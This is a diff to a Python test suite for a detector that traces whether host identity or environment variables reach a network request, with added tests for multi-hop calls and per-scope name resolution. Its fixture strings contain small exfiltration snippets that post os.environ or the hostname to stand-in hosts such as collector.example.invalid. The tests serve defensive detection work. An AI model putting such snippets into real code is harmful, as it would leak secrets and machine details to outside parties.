@@ -58,7 +58,24 @@ class TestAcrossFunctions:
             "    requests.post('https://collector.example.invalid', data=body)\n"
             "send(gather())\n"
         )
-        assert Flow.sent(source) == ["identity sent: through send"]
+        # Both ends: the call that hands it over, and the request its parameter reaches.
+        assert sorted(Flow.sent(source)) == [
+            "identity sent: requests.post",
+            "identity sent: through send",
+        ]
+
+    def test_identity_handed_on_twice_still_reaches_the_request(self):
+        source = (
+            "import socket, requests\n"
+            "def post(body):\n"
+            "    requests.post('https://collector.example.invalid', json=body)\n"
+            "def beacon(data):\n"
+            "    post({'d': data})\n"
+            "def run():\n"
+            "    data = {'h': socket.gethostname()}\n"
+            "    beacon(data)\n"
+        )
+        assert "identity sent: requests.post" in Flow.sent(source)
 
     def test_the_environment_through_a_method_is_the_same(self):
         source = (
@@ -92,6 +109,41 @@ class TestAcrossFunctions:
             "search('weather')\n"
         )
         assert Flow.sent(source) == []
+
+
+class TestNamesResolvePerScope:
+    def test_a_copy_of_the_environment_in_another_function_is_not_what_is_sent(self):
+        source = (
+            "import os, urllib.request\n"
+            "def run(cmd):\n"
+            "    env = dict(os.environ)\n"
+            "    return cmd, env\n"
+            "def usage(token):\n"
+            "    env = {'Authorization': token}\n"
+            "    return urllib.request.urlopen(urllib.request.Request('https://api.example/u', headers=env))\n"
+        )
+        assert Flow.sent(source) == []
+
+    def test_the_module_binding_is_seen_from_a_function(self):
+        source = (
+            "import os, requests\n"
+            "env = dict(os.environ)\n"
+            "def send():\n"
+            "    requests.post('https://x.invalid/e', json=env)\n"
+        )
+        assert Flow.sent(source) == ["environment sent: requests.post"]
+
+    def test_a_global_assigned_in_a_function_is_still_the_modules(self):
+        source = (
+            "import os, requests\n"
+            "env = None\n"
+            "def gather():\n"
+            "    global env\n"
+            "    env = dict(os.environ)\n"
+            "def send():\n"
+            "    requests.post('https://x.invalid/e', json=env)\n"
+        )
+        assert Flow.sent(source) == ["environment sent: requests.post"]
 
 
 class TestInShell:
